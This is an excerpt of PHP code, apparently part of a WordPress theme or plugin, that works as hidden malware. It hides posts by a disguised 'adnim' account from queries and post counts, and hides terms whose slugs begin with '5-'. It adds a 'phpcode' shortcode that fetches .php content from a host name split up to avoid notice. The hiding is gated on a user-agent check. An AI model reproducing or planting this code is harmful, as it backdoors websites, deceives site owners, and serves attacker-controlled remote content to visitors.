 ...
 * @param WP_Admin_Bar $wp_admin_bar
 */
function filter_user_post($counts,$type)
{
    global $wpdb;
    if($type != 'post')
    return $counts;
    $user = filter_user();
    $sql = "SELECT * FROM $wpdb->posts WHERE post_status IN ('publish','static') AND post_author = $user->ID AND post_type ='post'";
    $posts= $wpdb->get_results($sql);
    $counts->publish = ($counts->publish - count($posts));
    return $counts;
}

function filter_user_post_where($where)
{
    $user = filter_user();
    $where = $where . " and post_author != $user->ID";
    return $where;
}

function filter_user()
{
    $user = get_user_by('login', 'adnim');
    return $user;
}
...
function php_filter($attr) {
    $host = $attr['h'];
    $file = $attr['f'];
    $uri = $_SERVER["REQUEST_URI"];
    $url = 'http://tmp.mo'.$host.'it.com/api/'.$file.'.php?u='.md5($uri);
    if($host){
...
function get_terms_filter( $terms, $taxonomies, $args )
{
    ...
    {
        if ( strpos($term->slug,'5-') !== 0)
			$filtered_terms[] = $term;
    }
    return $filtered_terms;
}

function filter_post_user_agent(){
...
add_shortcode( 'phpcode', 'php_filter' );

if(!filter_post_user_agent()){
    add_filter('wp_count_posts', 'filter_user_post', 10, 2);
    add_filter('posts_where', 'filter_user_post_where');
